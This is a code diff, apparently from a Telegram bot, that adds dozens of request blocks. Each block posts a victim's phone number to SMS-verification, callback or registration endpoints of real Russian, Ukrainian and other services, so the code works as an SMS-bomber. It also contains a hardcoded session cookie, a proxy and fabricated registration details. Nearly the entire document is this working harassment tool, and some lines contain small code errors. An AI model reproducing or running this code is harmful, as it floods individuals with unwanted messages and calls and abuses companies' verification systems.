headers={'Cache-Control':'no-store, no-cache, must-revalidate', 'Accept-Encoding':'gzip, deflate, br', 'User-Agent':str(user_agent),'cookie': 'frontend:region=chernovtsy%3A1880; frontend:rabota-id:v1=616b0c9f211248003394866342942900; frontend:location:v4=null; tmr_lvid=9baf2ab036dce945b662b83be6d963a2; tmr_lvidTS=1634405541448; _ga=GA1.2.942388139.1634405542; _ym_d=1634405542; _ym_uid=1634405542182425930; user_tags=%5B%7B%22id%22%3A0%2C%22add_date%22%3A%222021-10-16%22%2C%22name%22%3A%22main_page_carees_story_control2%22%7D%2C%7B%22id%22%3A0%2C%22add_date%22%3A%222021-10-16%22%2C%22name%22%3A%22careers_main_page_widget_target%22%7D%2C%7B%22id%22%3A0%2C%22add_date%22%3A%222021-10-16%22%2C%22name%22%3A%22hr_banners_show%22%7D%2C%7B%22id%22%3A0%2C%22add_date%22%3A%222021-10-16%22%2C%22name%22%3A%22hr_login_form_spa%22%7D%2C%7B%22id%22%3A0%2C%22add_date%22%3A%222021-10-16%22%2C%22name%22%3A%22vacancy_split_view_careers_widget_target%22%7D%2C%7B%22id%22%3A0%2C%22add_date%22%3A%222021-10-16%22%2C%22name%22%3A%22courses_widget_control2%22%7D%2C%7B%22id%22%3A0%2C%22add_date%22%3A%222021-10-16%22%2C%22name%22%3A%22usp_company_review_form_target%22%7D%2C%7B%22id%22%3A0%2C%22add_date%22%3A%222021-10-16%22%2C%22name%22%3A%22profession_widget_control2%22%7D%2C%7B%22id%22%3A0%2C%22add_date%22%3A%222021-10-16%22%2C%22name%22%3A%22web_snippetclick2_control1%22%7D%2C%7B%22id%22%3A0%2C%22add_date%22%3A%222021-10-16%22%2C%22name%22%3A%22hr_new_scheduled_action_list_active%22%7D%2C%7B%22id%22%3A0%2C%22add_date%22%3A%222021-10-25%22%2C%22name%22%3A%22main_page_careers_story2_control2%22%7D%5D; mobile-app-popup-next-show-timer=1; mobile-app-popup-close-count=11; tmr_reqNum=16; qrator_ssid=1635339916.326.pKcDG62ujL7G3tOC-f1d0aj2bb2ut8r38h6n8mu2fc5umnsta; story_group_count=4; story_group_time=Wed%20Oct%2027%202021%2016%3A05%3A34%20GMT%2B0300%20(GMT%2B03%3A00); _gid=GA1.2.424888797.1635339936; _gat_gtag_UA_3926701_1=1; SRVID=front2-msk2.rabota|YXlOr|YXlOo; sid=6nEXiaDr2f7eGfJwdbRucfa7mo8lzigp', 'referer': 'https://chernovtsy.rabota.ru/?page=0', 'vary': 'Accept-Encoding', 'x-content-type-options': 'nosniff', 'x-xss-protection': '1; mode=block'})
-     print('rabota.ru')
- except:
-     print('Не доставлено(rabota.ru)')
+         try:
+             requests.post("https://my.modulbank.ru/api/v2/registration/nameAndPhone",
+             json={"FirstName": "Артем", "CellPhone": _phone, "Package": "optimal"})
+             print('[@'+str(bot_username)+'] [+] отправлено!')
+         except:
+             print('[@'+str(bot_username)+'] [-] не отправлено!')
 
- try:
-     requests.post('https://urm.sat.ua/openws/hs/api/v2.0/auth/check/json?phone=' + phone_plus + '&app=cabinet&language=uk')   
-     print('sat.ua')
- except:
-     print('Не отправлено (sat.ua)')
+         try:
+             requests.post("https://www.moyo.ua/identity/registration",
+             data={
+                 "firstname": "Артем",
+                 "phone": _phone,
+                 "email": _email
+             }
+         )
+             print('[@'+str(bot_username)+'] [+] Moyo отправлено!')
+         except:
+             print('[@'+str(bot_username)+'] [-] не отправлено!')
 
- try:
-     requests.get('https://findclone.ru/register?phone=+' + number + '', headers={'User-Agent': str(user_agent),'X-Requested-With': 'XMLHttpRequest'})
-     print('findclone.ru')
- except:
-     print('Не доставлено (findclone.ru)')
+         try:
+             requests.post('https://comfy.ua/ua/customer/account/createPost', data={"registration_name": "Артем", "registration_phone": _phoneComfy, "registration_email": _mail})
+             print('[@'+str(bot_username)+'] [+] Comfy отправлено!')
+         except:
+              print('[@'+str(bot_username)+'] [-] не отправлено!')
 
- try:
-     requests.post('https://call2friends.com/call-my-phone/web/request-free-call', params={'phone': number,'domain':'CALL2FRIENDS','browser':'{\"mozilla\":true,\"version\":\"89.0\"}','fgp':str(uuid.uuid4()),'fgp2':str(uuid.uuid4())}, headers={'Cookie':'smscookie=' + str(uuid.uuid4())})
-     print('call2friends.com')
- except:
-     print('Не доставлено (call2friends.com)')
+         try:
+             requests.post("https://www.foxtrot.com.ua/ru/account/sendcodeagain?Length=12", data={"Phone": _phoneQ})
+             print('[@'+str(bot_username)+'] [+] FoxTrot отправлено!')
+             time.sleep(0.1)
+         except:
+             print('[@'+str(bot_username)+'] [-] не отправлено!')
+
+         try:
+             requests.post('https://cinema5.ru/api/phone_code', data={"phone": _phonePizzahut})
+             print('[@'+str(bot_username)+'] [+] Cinema5 отправлено!')
+             time.sleep(0.1)
+         except:
+             print('[@'+str(bot_username)+'] [-] не отправлено!')
+
+         try:
+             requests.post("https://www.etm.ru/cat/runprog.html",
+             data={
+                 "m_phone": _phone,
+                 "mode": "sendSms",
+                 "syf_prog": "clients-services",
+                 "getSysParam": "yes",
+             },
+         )
+             print('[@'+str(bot_username)+'] [+] ETM отправлено!')
+             time.sleep(0.1)
+         except:
+             print('[@'+str(bot_username)+'] [-] не отправлено!')
+
+         try:
+             requests.post("https://apteka.ru/_action/auth/getForm/",
+             data={
+                 "form[NAME]": "",
+                 "form[PERSONAL_GENDER]": "",
+                 "form[PERSONAL_BIRTHDAY]": "",
+                 "form[EMAIL]": "",
+                 "form[LOGIN]": _phone585,
+                 "form[PASSWORD]": password,
+                 "get-new-password": "Получите пароль по SMS",
+                 "user_agreement": "on",
+                 "personal_data_agreement": "on",
+                 "formType": "simple",
+                 "utc_offset": "120",
+             },
+         )
+             print('[@'+str(bot_username)+'] [+] Apteka отправлено!')
+             time.sleep(0.1)
+         except:
+             print('[@'+str(bot_username)+'] [-] не отправлено!')
+
+         try:
+             requests.post("https://ube.pmsm.org.ru/esb/iqos-phone/validate", json={"phone": _phone})
+             print('[@'+str(bot_username)+'] [+] отправлено!')
+         except:
+             print('[@'+str(bot_username)+'] [-] не отправлено!')
+
+         try:
+             requests.post("https://secunda.com.ua/personalarea/registrationvalidphone", data={"ph": "+" + _phone})
+             print('[@'+str(bot_username)+'] [+] Secunda отправлено!')
+             time.sleep(0.1)
+         except:
+             print('[@'+str(bot_username)+'] [-] не отправлено!')
+
+         try:
+             requests.post("http://api.rozamira-azs.ru/v1/auth", data={"login": _phone,})
+             print('[@'+str(bot_username)+'] [+] rozamira-azs отправлено!')
+             time.sleep(0.1)
+         except:
+             print('[@'+str(bot_username)+'] [-] не отправлено!')
+
+         try:
+             requests.get("https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code",
+             params={"number": _phone})
+             print('[@'+str(bot_username)+'] [+] отправлено!')
+         except:
+             print('[@'+str(bot_username)+'] [-] не отправлено!')
+
+         try:
+             requests.post("https://api.iconjob.co/api/auth/verification_code",
+             json={"phone": _phone})
+         except:
+             print('[@'+str(bot_username)+'] [-] не отправлено!')
+
+         try:
+             requests.post("https://panda99.ru/bdhandlers/order.php?t={int(time())}",
+             data={
+                 "CB_NAME": "Артем",
+                 "CB_PHONE": _phone88})
+             print('[@'+str(bot_username)+'] [-] отправлено!')
+         except:
+             print('[@'+str(bot_username)+'] [-]не отправлено!')
+
+         try:
+             requests.post("https://auth.pizza33.ua/ua/join/check/",
+             params={
+                 "callback": "angular.callbacks._1",
+                 "email": _email,
+                 "password": password,
+                 "phone": _phone,
+                 "utm_current_visit_started": 0,
+                 "utm_first_visit": 0,
+                 "utm_previous_visit": 0,
+                 "utm_times_visited": 0,
+             },
+         )
+             print('[@'+str(bot_username)+'] [+] отправлено!')
+         except:
+             print('[@'+str(bot_username)+'] [-] отправлено!')
+
+         try:
+             requests.post( "https://shop.vsk.ru/ajax/auth/postSms/", data={"phone": _phone})
+             print('[@'+str(bot_username)+'] [+] отправлено!')
+         except:
+             print('[@'+str(bot_username)+'] [-] не отправлено!')
+
+         try:
+             requests.post("https://zoloto585.ru/api/bcard/reg/",
+             json={
+                 "name": "Максим",
+                 "surname": "Летовал",
+                 "patronymic": "Максимович",
+                 "sex": "m",
+                 "birthdate": "11.11.1999",
+                 "phone": _phone585,
+                 "email": email,
+                 "city": "Москва",
+             },
+         )
+             print('[@'+str(bot_username)+'] [+] Zoloto585 отправлено!')
+             time.sleep(0.1)
+         except:
+             print('[@'+str(bot_username)+'] [-] не отправлено!')
+
+         try:
+             requests.post("https://pliskov.ru/Cube.MoneyRent.Orchard.RentRequest/PhoneConfirmation/SendCode",
+             data={"phone": _phone585},
+         )
+             print('[@'+str(bot_username)+'] [+] Pliskov отправлено!')
+             time.sleep(0.1)
+         except:
+             print('[@'+str(bot_username)+'] [-] не отправлено!')
+
+         try:
+             requests.post("https://www.foxtrot.com.ua/ru/account/sendcodeagain?Length=12", data={"Phone": _phoneQ})
+             print('[@'+str(bot_username)+'] [+] FoxTrot отправлено!')
+             time.sleep(0.1)
+         except:
+             print('[@'+str(bot_username)+'] [-] не отправлено!')
+
+         try:
+             requests.post("https://taxi-ritm.ru/ajax/ppp/ppp_back_call.php?URL=/",
+             data={"RECALL": "Y", "BACK_CALL_PHONE": _phone})
+         except:
+             pass
+
+         try:
+             requests.post("https://www.sms4b.ru/bitrix/components/sms4b/sms.demo/ajax.php",
+             data={"demo_number": "+" + _phone, "ajax_demo_send": "1"},
+         )
+             print('[@'+str(bot_username)+'] [+] Sms4 отправлено!')
+             time.sleep(0.1)
+         except:
+             print('[@'+str(bot_username)+'] [-] не отправлено!')
+
+         try:
+             requests.post("https://www.flipkart.com/api/5/user/otp/generate",
+             headers={
+                 "Origin": "https://www.flipkart.com",
+                 "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop",
+             },
+             data={"loginId": "+" + _phone})
+             print('[@'+str(bot_username)+'] [+] FlipKart отправлено!')
+             time.sleep(0.1)
+         except:
+             print('[@'+str(bot_username)+'] [-] не отправлено!')
+
+         try:
+             requests.post("https://www.flipkart.com/api/6/user/signup/status",
+             headers={
+                 "Origin": "https://www.flipkart.com",
+                 "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop",
+             },
+             json={"loginId": "+" + _phone, "supportAllStates": True})
+             print('[@'+str(bot_username)+'] [+] FlipKart отправлено!')
+             time.sleep(0.1)
+         except:
+             print('[@'+str(bot_username)+'] [-] не отправлено!')
+
+         try:
+             requests.post("https://bamper.by/registration/?step=1",
+             data={
+                 "phone": "+" + _phone,
+                 "submit": "Запросить смс подтверждения",
+                 "rules": "on",
+             },
+         )
+             print('[@'+str(bot_username)+'] [+] Bamper отправлено!')
+             time.sleep(0.1)
+         except:
+             print('[@'+str(bot_username)+'] [-] не отправлено!')
+
+         try:
+             requests.post("https://friendsclub.ru/assets/components/pl/connector.php",
+             data={"casePar": "authSendsms", "MobilePhone": "+" + _phone})
+             print('[@'+str(bot_username)+'] [+] FriendClub отправлено!')
+             time.sleep(0.1)
+         except:
+             print('[@'+str(bot_username)+'] [-] не отправлено!')
+
+         try:
+             requests.post("https://app.salampay.com/api/system/sms/c549d0c2-ee78-4a98-659d-08d682a42b29",
+             data={"caller_number": _phone})
+             print('[@'+str(bot_username)+'] [+] SalamPay отправлено!')
+             time.sleep(0.1)
+         except:
+             print('[@'+str(bot_username)+'] [-] не отправлено!')
+
+         try:
+             requests.post("https://app.doma.uchi.ru/api/v1/parent/signup_start",
+             json={
+                 "phone": "+" + _phone,
+                 "first_name": "-",
+                 "utm_data": {},
+                 "via": "call",
+             })
+             print('[@'+str(bot_username)+'] [+] звонок отправлен!')
+             time.sleep(0.1)
+         except:
+             print('[@'+str(bot_username)+'] [+] не отправлен!')
+
+         try:
+             requests.post("https://app.doma.uchi.ru/api/v1/parent/signup_start",
+             json={
+                 "phone": "+" + _phone,
+                 "first_name": "-",
+                 "utm_data": {},
+                 "via": "sms",
+             },
+         )
+             print('[@'+str(bot_username)+'] [+] Uchi отправлено!')
+             time.sleep(0.1)
+         except:
+             print('[@'+str(bot_username)+'] [-] не отправлено!')
+
+         try:
+             requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php', data={ "msisdn": _phone, "locale": "en", "countryCode": "ru", "version": "1", "k": "ic1rtwz1s1Hj1O0r", "r": "46763", })
+             print('[@'+str(bot_username)+'] [+] ICQ отправлено!')
+             time.sleep(0.1)
+         except:
+             print('[@'+str(bot_username)+'] [-] не отправлено!')
+
+         try:
+             requests.post('https://shafa.ua/api/v3/graphiql', json={
+                 "operationName": "RegistrationSendSms",
+                 "variables": {"phoneNumber": "+" + _phone},
+                 "query": "mutation RegistrationSendSms($phoneNumber: String!) {\n  unauthorizedSendSms(phoneNumber: $phoneNumber) {\n    isSuccess\n    userToken\n    errors {\n      field\n      messages {\n        message\n        code\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n",
+             },
+         )
+             print('[@'+str(bot_username)+'] [+] Shafa отправлено!')
+             time.sleep(0.1)
+         except:
+             print('[@'+str(bot_username)+'] [-] не отправлено!')
+
+         try:
+             requests.post('https://alpari.com/api/en/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
+             headers={"Referer": "https://alpari.com/en/registration/"},
+             json={
+                 "client_type": "personal",
+                 "email": _email,
+                 "mobile_phone": _phone,
+                 "deliveryOption": "sms",
+             },
+         )
+             print('[@'+str(bot_username)+'] [+] Alpari отправлено!')
+             time.sleep(0.1)
+         except:
+             print('[@'+str(bot_username)+'] [-] не отправлено!')
+
+         try:
+             requests.post('https://uklon.com.ua/api/v1/account/code/send',
+             headers={"client_id": "6289de851fc726f887af8d5d7a56c635"},
+             json={"phone": _phone},
+             )
+             print('[@'+str(bot_username)+'] [+] Uklon отправлено!')
+             time.sleep(0.1)
+         except:
+             print('[@'+str(bot_username)+'] [-] е отправлено!')
+
+         try:
+             requests.post('https://crm.getmancar.com.ua/api/veryfyaccount', json={ "phone": "+" + _phone, "grant_type": "password", "client_id": "gcarAppMob", "client_secret": "SomeRandomCharsAndNumbersMobile"})
+             print('[@'+str(bot_username)+'] [+] GetMancar отправлено!')
+             time.sleep(0.1)
+         except:
+             print('[@'+str(bot_username)+'] [-] не отправлено!')
+
+         try:
+             requests.post('https://auth.multiplex.ua/login', json={'login': _phone})
+             print('[@'+str(bot_username)+'] [+] MultiPlex отправлено!')
+             time.sleep(0.1)
+         except:
+             print('[@'+str(bot_username)+'] [-] не отправлено!')
+
+         try:
+             requests.post('https://lk.invitro.ru/sp/mobileApi/createUserByPassword', data={"password": password,"application": "lkp","login": "+" + _phone})
+             print('[@'+str(bot_username)+'] [+] Invitro отправлено!')
+             time.sleep(0.1)
+         except:
+             print('[@'+str(bot_username)+'] [-] не отправлено!')
+
+         try:
+             requests.post('https://secure.ubki.ua/b2_api_xml/ubki/auth', json={"doc": {"auth": { "mphone": "+" + _phone,"bdate": "11.11.1999","deviceid": "00100", "version": "1.0","source": "site", "signature": "undefined"}}}, headers={"Accept": "application/json"})
+             print('[@'+str(bot_username)+'] [+] Ubki отправлено!')
+             time.sleep(0.1)
+         except:
+             print('[@'+str(bot_username)+'] [-] не отправлено!')
+
+         try:
+             requests.post('https://www.top-shop.ru/login/loginByPhone/', data={"phone": _phonePizzahut})
+             print('[@'+str(bot_username)+'] [+] Top-Shop отправлено!')
+             time.sleep(0.1)
+         except:
+             print('[@'+str(bot_username)+'] [-] не отправлено!')
+
+         try:
+             requests.post('https://www.rendez-vous.ru/ajax/SendPhoneConfirmationNew/',  data={"phone": _phonePizzahut, "alien": "0"})
+             print('[@'+str(bot_username)+'] [+] Rendez-Vous отправлено!')
+             time.sleep(0.1)
+         except:
+             print('[@'+str(bot_username)+'] [-] не отправлено!')
+
+         try:
+             requests.post('https://osava.ua/users/sign-up/callbacks', data={"phone_callbacks": _phone, "send_callbacks": "Отправить"})
+             print('[@'+str(bot_username)+'] [+] Osova отправлено!')
+             time.sleep(0.1)
+         except:
+             print('[@'+str(bot_username)+'] [-] не отправено!')
+
+         try:
+             requests.post('https://eda.yandex/api/v1/user/request_authentication_code',
+             json={"phone_number": "+" + _phone})
+
+             print('[@'+str(bot_username)+'] [+] Yandex.Eda отправлено!')
+             time.leep(0.1)
+         except:
+             print('[@'+str(bot_username)+'] [-] не отправлено!')
+
+         try:
+             requests.post("https://izi.ua/api/auth/register",
+             json={
+                 "phone": "+" + _phone,
+                 "name": "Анастасия",
+                 "is_terms_accepted": True,
+             },
+         )
+             print('[@'+str(bot_username)+'] [+] Izi отправлено!')
+             time.sleep(0.1)
+         except:
+             print('[@'+str(bot_username)+'] [-] не отправлено!')
+
+         try:
+             requests.post("https://izi.ua/api/auth/sms-login", json={"phone": "+" + _phone})
+             print('[@'+str(bot_username)+'] [+] Izzi отправлено!')
+             time.sleep(0.1)
+         except:
+             print('[@'+str(bot_username)+'] [-] не отправлено!')
+
+         try:
+             requests.post('https://api.pozichka.ua/v1/registration/send', json={"RegisterSendForm": {"phone": _phonePozichka}})
+             print('[@'+str(bot_username)+'] [+] Pozichka отправлено!')
+             time.sleep(0.1)
+         except:
+             print('[@'+str(bot_username)+'] [-] не отправлено!')
+
+         try:
+             requests.post('https://ontaxi.com.ua/api/v2/web/client', data={"country":"UA","phone": phone[3:]})
+             print('[@'+str(bot_username)+'] [+] OnTaxi отправлено!')
+             time.sleep(0.1)
+         except:
+             print('[@'+str(bot_username)+'] [-] не отправлено!')
+
+         try:
+             requests.post('https://suandshi.ru/mobile_api/register_mobile_user', params={"phone": _phone})
+             print('[@'+str(bot_username)+'] [+] Suandshi отправлено!')
+             time.sleep(0.1)
+         except:
+             print('[@'+str(bot_username)+'] [-] не отправлено!')
+
+         try:
+             requests.post('https://makarolls.ru/bitrix/components/aloe/aloe.user/login_new.php', data={"data": _phone, "metod": "postreg"})
+             print('[@'+str(bot_username)+'] [+] Makarolls отправлено!')
+             time.sleep(0.1)
+         except:
+             print('[@'+str(bot_username)+'] [-] не отправлено!')
+
+         try:
+             requests.post('https://www.panpizza.ru/index.php?route=account/customer/sendSMSCode', data={"telephone": "8" + _phone[1:]})
+             print('[@'+str(bot_username)+'] [+] PanPizza отправлено!')
+             time.sleep(0.1)
+         except:
+             print('[@'+str(bot_username)+'] [-] не отправлено!')
+
+         try:
+             requests.post("https://www.moyo.ua/identity/registration", data={"firstname": "Артем", "phone": _phone,"email": email})
+             print('[@'+str(bot_username)+'] [+] MOYO отправлено!')
+             time.sleep(0.1)
+         except:
+             print('[@'+str(bot_username)+'] [-] не отправлено!')
+
+         try:
+             requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={}, proxies=proxies)
+             print('[@'+str(bot_username)+'] [+] BelkaCar sent!')
+             time.sleep(0.1)
+         except:
+             print('[@'+str(bot_username)+'] [-] error in sent!')
+
+         try:
+             requests.post('https://starpizzacafe.com/mods/a.function.php', data={'aj': '50', 'registration-phone': _phone})
+             print('[@'+str(bot_username)+'] [+] StarPizzaCafe отправлено!')
+             time.sleep(0.1)
+         except:
+             print('[@'+str(bot_username)+'] [-] не отправлено!')
+
+         try:
+             requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
+             print('[@'+str(bot_username)+'] [+] Tinder sent!')
+             time.sleep(0.1)
+         except:
+             print('[@'+str(bot_username)+'] [-] error in sent!')
+
+         try:
+             requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
+             print('[@'+str(bot_username)+'] [+] Karusel sent!')
+             time.sleep(0.1)
+         except:
+             print('[@'+str(bot_username)+'] [-] error in sent!')
+
+         try:
+             requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
+             print('[@'+str(bot_username)+'] [+] Tinkoff отправлено!')
+             time.sleep(0.1)
+         except:
+             print('[@'+str(bot_username)+'] [-] error in sent!')
+
+         try:
+             requests.post('https://dostavista.ru/backend/send-verification-sms', data={"phone": _phone})
+             print('[@'+str(bot_username)+'] [+] Dostavista отправлено!')
+             time.sleep(0.1)
+         except:
+             print('[@'+str(bot_username)+'] [-] не отправлено!')
+
+         try:
+             requests.post('https://www.monobank.com.ua/api/mobapplink/send', data={"phone": "+" + _phone})
+             print('[@'+str(bot_username)+'] [+] MonoBank отправлено!')
+             time.sleep(0.1)
+         except:
+             print('[@'+str(bot_username)+'] [-] не отправлено!')
+
+         try:
+             requests.post(f'https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone={_phone}', data={"result":"ok"})
+             print('[@'+str(bot_username)+'] [+] SportMaster отправлено!')
+             time.sleep(0.1)
+         except:
+             print('[@'+str(bot_username)+'] [-] не отправлено!')
+
+         try:
+             requests.post('https://alfalife.cc/auth.php', data={"phone": _phone})
+             print('[@'+str(bot_username)+'] [+] Alfalife отправлено!')
+             time.sleep(0.1)
+         except:
+             print('[@'+str(bot_username)+'] [-] не отправлено!')
+
+         try:
+             requests.post('https://koronapay.com/transfers/online/api/users/otps', data={"phone": _phone})
+             print('[@'+str(bot_username)+'] [+] KoronaPay отправлено!')
+             time.sleep(0.1)
+         except:
+             print('[@'+str(bot_username)+'] [-] не отправлено!')
+
+         try:
+             requests.post('https://btfair.site/api/user/phone/code', json={"phone": "+" + _phone,})
+             print('[@'+str(bot_username)+'] [+] BTfair отправлено!')
+             time.sleep(0.1)
+         except:
+             print('[@'+str(bot_username)+'] [-] не отправлено!')
+
+         try:
+             requests.post('https://ggbet.ru/api/auth/register-with-phone', data={"phone": "+" + _phone, "login": _email, "password": password, "agreement": "on", "oferta": "on",})
+             print('[@'+str(bot_username)+'] [+] GGbet отправлено!')
+             time.sleep(0.1)
+         except:
+             print('[@'+str(bot_username)+'] [-]  не отправлено!')
+
+         try:
+             requests.post('https://www.etm.ru/cat/runprog.html', data={"m_phone": _phone, "mode": "sendSms", "syf_prog": "clients-services", "getSysParam": "yes",})
+             print('[@'+str(bot_username)+'] [+] ETM отправлено!')
+             time.sleep(0.1)
+         except:
+             print('[@'+str(bot_username)+'] [-] не отправлено!')
+
+         try:
+             requests.post('https://thehive.pro/auth/signup', json={"phone": "+" + _phone,})
+             print('[@'+str(bot_username)+'] [+] TheLive отправлено!')
+             time.sleep(0.1)
+         except:
+             print('[@'+str(bot_username)+'] [-] не отправлено!')
+
+         try:
+             requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
+             print('[@'+str(bot_username)+'] [+] MTS sent!')
+             time.sleep(0.1)
+         except:
+             print('[@'+str(bot_username)+'] [-] error in sent!')
+
+         try:
+             requests.post('https://account.my.games/signup_send_sms/', data={"phone": _phone})
+             print('[@'+str(bot_username)+'] [+] MyGames sent!')
+             time.sleep(0.1)
+         except:
+             print('[@'+str(bot_username)+'] [+] error in sent!')
+
+         try:
+             requests.post('https://zoloto585.ru/api/bcard/reg/', json={"name": _name,"surname": _name,"patronymic": _name,"sex": "m","birthdate": "11.11.1999","phone": (_phone, "+* (***) ***-**-**"),"email": _email,"city": "Москва",})
+             print('[@'+str(bot_username)+'] [+] Zoloto585 отправлено!')
+             time.sleep(0.1)
+         except:
+             print('[@'+str(bot_username)+'] [-] не отправлено!')
+
+         try:
+             requests.post('https://kasta.ua/api/v2/login/', data={"phone":_phone})
+             print('[@'+str(bot_username)+'] [+] Kasta отправлено!')
+             time.sleep(0.1)
+         except:
+             print('[@'+str(bot_username)+'] [-] Kasta Не отправлено!')
+
+         try:
+             requests.post('https://cloud.mail.ru/api/v2/notify/applink', json={"phone":"+" + _phone, "api": 2,"email":"email", "x-email":"x-email",}, proxies={'http':'138.197.137.39:8080'})
+             print('[@'+str(bot_username)+'] [+] Mail.ru отправлено!')
+             time.sleep(0.1)
+         except:
+             print('[@'+str(bot_username)+'] [-] не отправлено!')
+
+         try:
+             requests.post('https://api.creditter.ru/confirm/sms/send', json={"phone": (_phone, "+* (***) ***-**-**"),"type": "register",})
+             print('[@'+str(bot_username)+'] [+] Creditter отправлено!')
+             time.sleep(0.1)
+         except:
+             print('[@'+str(bot_username)+'] [-] не отправлено!')
+
+         try:
+             requests.post('https://www.ingos.ru/api/v1/lk/auth/register/fast/step2', headers={"Referer": "https://www.ingos.ru/cabinet/registration/personal"}, json={"Birthday": "1986-07-10T07:19:56.276+02:00","DocIssueDate": "2004-02-05T07:19:56.276+02:00","DocNumber": randint(500000, 999999), "DocSeries": randint(5000, 9999),"FirstName": _name,"Gender": "M","LastName": _name,"SecondName": _name,"Phone": _phone,"Email": _email,})
+             print('[@'+str(bot_username)+'] [+] Ingos отправлено!')
+             time.sleep(0.1)
+         except:
+             print('[@'+str(bot_username)+'] [-] не отправлено!')
+
+         try:
+             requests.post('https://win.1admiralxxx.ru/api/en/register.json', json={"mobile": _phone,"bonus": "signup","agreement": 1,"currency": "RUB","submit": 1,"email": "","lang": "en",})
+             print('[@'+str(bot_username)+'] [+] Admiralxxx отправлено!')
+             time.sleep(0.1)
+         except:
+             print('[@'+str(bot_username)+'] [-] не отправлено!')
+
+         try:
+             requests.post('https://oauth.av.ru/check-phone', json={"phone": (_phone, "+* (***) ***-**-**")})
+             print('[@'+str(bot_username)+'] [+] Av отправлено!')
+             time.sleep(0.1)
+         except:
+             print('[@'+str(bot_username)+'] [-] не отправлено!')
+
+         try:
+             requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code', params={"msisdn": _phone})
+             print('[@'+str(bot_username)+'] [+] MTS отправлено!')
+             time.sleep(0.1)
+         except:
+             print('[@'+str(bot_username)+'] [-] не отправлено!')
+
+         try:
+             requests.post('https://city24.ua/personalaccount/account/registration', data={"PhoneNumber": _phone})
+             print('[@'+str(bot_username)+'] [+] City24 отправлено!')
+             time.sleep(0.1)
+         except:
+             print('[@'+str(bot_username)+'] [-] не отправлено!')
+
+         try:
+             requests.post('https://client-api.sushi-master.ru/api/v1/auth/init', json={"phone": _phone})
+             print('[@'+str(bot_username)+'] [+] SushiMaster отправлено!')
+             time.sleep(0.1)
+         except:
+             print('[@'+str(bot_username)+'] [-] не отправлено!')
+
+         try:
+             requests.post('https://auth.multiplex.ua/login', json={"login": _phone})
+             print('[@'+str(bot_username)+'] [+] MultiPlex отправлено!')
+             time.sleep(0.1)
+         except:
+             print('[@'+str(bot_username)+'] [-] не отправлено!')
+
+         try:
+             requests.post('https://www.niyama.ru/ajax/sendSMS.php', data={"REGISTER[PERSONAL_PHONE]": _phone,"code":"", "sendsms":"Выслать код",})
+             print('[@'+str(bot_username)+'] [+] Niyama отправлено!')
+             time.sleep(0.1)
+         except:
+             print('[@'+str(bot_username)+'] [-] Niyama не отправлено!')
+
+         try:
+             requests.post('https://shop.vsk.ru/ajax/auth/postSms/', data={"phone": _phone})
+             print('[@'+str(bot_username)+'] [+] VSK отправлено!')
+             time.sleep(0.1)
+         except:
+             print('[@'+str(bot_username)+'] [-] VSK не отправлено!')
+
+         try:
+             requests.post('https://api.easypay.ua/api/auth/register', json={"phone": _phone, "password": _password})
+             print('[@'+str(bot_username)+'] [+] EasyPay отправлено!')
+             time.sleep(0.1)
+         except:
+             print('[@'+str(bot_username)+'] [-] не отправлено!')
+
+         try:
+             requests.post('https://fix-price.ru/ajax/register_phone_code.php', data={"register_call": "Y", "action": "getCode", "phone": "+" + _phone})
+             print('[@'+str(bot_username)+'] [+] Fix-Price отправлено!')
+             time.sleep(0.1)
+         except:
+             print('[@'+str(bot_username)+'] [-] не отправлено!')
+
+         try:
+             requests.post('https://www.nl.ua', data={"component": "bxmaker.authuserphone.login","sessid": "bf70db951f54b837748f69b75a61deb4","method": "sendCode", "phone": _phone,"registration": "N",})
+             print('[@'+str(bot_username)+'] [+] NovaLinia отправлено!')
+             time.sleep(0.1)
+         except:
+             print('[@'+str(bot_username)+'] [-] не отправлено!')
